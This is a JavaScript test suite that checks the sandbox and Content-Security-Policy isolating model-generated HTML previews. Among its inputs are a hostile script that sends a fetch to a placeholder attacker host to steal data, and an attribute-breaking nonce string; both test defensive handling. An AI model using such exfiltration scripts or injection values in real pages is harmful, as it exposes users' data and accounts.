import assert from "node:assert/strict";
import test from "node:test";

import {
  HTML_PREVIEW_CDN_HOSTS,
  HTML_PREVIEW_CSP,
  HTML_PREVIEW_MAX_BYTES,
  HTML_PREVIEW_SANDBOX,
  buildHtmlPreviewSrcdoc,
  isHtmlPreviewSmallEnough,
  isHtmlPreviewable,
  withEmbedderNonce,
} from "../lib/htmlArtifactPreview.ts";

/**
 * The isolation of the generated-HTML preview, pinned as strings.
 *
 * These assertions are the contract: a model-written page runs with script,
 * and what keeps it away from the signed-in account is the sandbox attribute
 * and the policy below. Loosening either has to break one of these.
 */

const directives = Object.fromEntries(
  HTML_PREVIEW_CSP.split(";").map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...values] = part.split(/\s+/);
    return [name, values];
  })
);

test("the sandbox grants scripts and nothing else, and above all not the app's origin", () => {
  const tokens = HTML_PREVIEW_SANDBOX.split(/\s+/).filter(Boolean);
  assert.deepEqual(tokens, ["allow-scripts"]);
  for (const forbidden of [
    "allow-same-origin", "allow-top-navigation", "allow-top-navigation-by-user-activation", "allow-top-navigation-to-custom-protocols",
    "allow-popups", "allow-popups-to-escape-sandbox", "allow-forms", "allow-modals", "allow-downloads", "allow-pointer-lock",
    "allow-presentation", "allow-orientation-lock", "allow-storage-access-by-user-activation",
  ]) {
    assert.ok(!tokens.includes(forbidden), forbidden);
  }
});

test("the policy cuts every channel a sandboxed script would have left", () => {
  assert.deepEqual(directives["default-src"], ["'none'"]);
  assert.deepEqual(directives["connect-src"], ["'none'"], "no fetch, XHR, WebSocket or beacon");
  assert.deepEqual(directives["form-action"], ["'none'"], "no form submission");
  assert.deepEqual(directives["base-uri"], ["'none'"], "no <base> to redirect relative URLs");
  assert.deepEqual(directives["frame-src"], ["'none'"], "no nested documents");
  assert.deepEqual(directives["object-src"], ["'none'"]);
  assert.deepEqual(directives["worker-src"], ["'none'"]);
  assert.deepEqual(directives["manifest-src"], ["'none'"]);
});

test("script, style, image and font sources are inline or one of three public CDNs, never a wildcard or a scheme", () => {
  assert.deepEqual([...HTML_PREVIEW_CDN_HOSTS], ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net", "https://unpkg.com"]);
  for (const name of ["script-src", "style-src", "img-src", "font-src"]) {
    for (const value of directives[name]) {
      assert.ok(
        value === "'unsafe-inline'" || value === "data:" || value === "blob:" || HTML_PREVIEW_CDN_HOSTS.includes(value),
        `${name} allows ${value}`
      );
    }
  }
  assert.ok(directives["script-src"].includes("'unsafe-inline'"), "an inline chart script must run");
  assert.ok(!HTML_PREVIEW_CSP.includes("'unsafe-eval'"), "no eval or Function from a string");
  assert.ok(!/(^|\s)\*(\s|;|$)/.test(HTML_PREVIEW_CSP), "no wildcard source");
  assert.ok(!/(^|\s)https?:(\s|;|$)/.test(HTML_PREVIEW_CSP), "no whole-scheme source");
  // Pages may draw with inline images, but remote images are limited to the CDNs: a hostile page cannot ping a server of its choosing.
  assert.ok(!directives["img-src"].some((value) => /^https?:\/\/(?!cdnjs|cdn\.jsdelivr|unpkg)/.test(value)));
});

test("the policy meta is the first element of the document, ahead of anything the page says", () => {
  const hostile = `<!-- <head> --><script>fetch("https://attacker.example/steal")</script>`;
  const srcdoc = buildHtmlPreviewSrcdoc(hostile);
  assert.ok(srcdoc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
  assert.ok(srcdoc.indexOf("Content-Security-Policy") < srcdoc.indexOf("<script>"));
  assert.ok(srcdoc.endsWith(hostile), "the page is carried exactly as written");
});

test("the page's own doctype is replaced by ours so the frame does not fall into quirks mode", () => {
  const srcdoc = buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>');
  assert.equal(srcdoc.match(/<!doctype/gi).length, 1);
  assert.ok(srcdoc.endsWith("<html><body>x</body></html>"));
  // A doctype that is not at the start is the page's content and is left alone.
  assert.equal(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>").match(/<!doctype/gi).length, 2);
});

test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
  const page = `<meta http-equiv="Content-Security-Policy" content="default-src *"><body>hi</body>`;
  const srcdoc = buildHtmlPreviewSrcdoc(page);
  assert.ok(srcdoc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
});

test("only a ready HTML file within the size limit is previewed", () => {
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "htm", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "HTML", byteSize: 10, status: "ready" }), true);
  for (const format of ["svg", "xml", "js", "md", "pdf", "xlsx", "css", "txt"]) {
    assert.equal(isHtmlPreviewable({ format, byteSize: 10, status: "ready" }), false, format);
  }
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "failed" }), false);
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "blocked" }), false);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES), true);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES + 1), false);
  assert.equal(isHtmlPreviewSmallEnough(Number.NaN), false);
  assert.equal(isHtmlPreviewSmallEnough(-1), false);
});

test("the embedder's nonce goes on the page's script, style and stylesheet elements, by the browser parser, and only when it is a plain token", () => {
  const touched = [];
  let asked = null;
  const parse = () => ({
    querySelectorAll: (selector) => { asked = selector; return [1, 2, 3].map((n) => ({ setAttribute: (name, value) => touched.push([n, name, value]) })); },
    documentElement: { outerHTML: "<html>rewritten</html>" },
  });
  assert.equal(withEmbedderNonce("<p>x</p>", "abc123def456", parse), "<html>rewritten</html>");
  assert.match(asked, /script/);
  assert.match(asked, /style/);
  assert.match(asked, /link/);
  assert.deepEqual(touched.map(([, name, value]) => [name, value]), Array(3).fill(["nonce", "abc123def456"]));
  // No nonce on the embedding page, or one that could break out of an attribute: the page is untouched.
  for (const nonce of [null, undefined, "", "short", "abc\" onload=\"x", "a b c d e f g h", "x".repeat(300)]) {
    assert.equal(withEmbedderNonce("<p>x</p>", nonce, () => { throw new Error("must not parse"); }), "<p>x</p>");
  }
});
